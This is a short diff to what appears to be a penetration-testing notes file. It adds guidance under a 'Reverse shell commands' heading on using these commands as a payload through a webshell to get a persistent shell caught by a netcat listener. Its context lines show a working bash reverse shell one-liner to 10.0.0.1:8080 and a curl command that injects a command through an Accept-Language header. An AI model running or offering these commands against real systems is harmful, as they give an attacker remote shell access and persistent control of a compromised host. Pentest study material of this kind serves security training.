@@ -10,7 +10,10 @@ then `curl http://example.com -H "Accept-Language: command"`
 Make sure commands are URL encoded
 
 # Reverse shell commands
+These commands can be passed as the payload once you ahve a webshell to create a more persistent shell. Make sure to create a corresponding listening service using netcat to catch the shell.
+
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 ## Bash
     bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ## Python
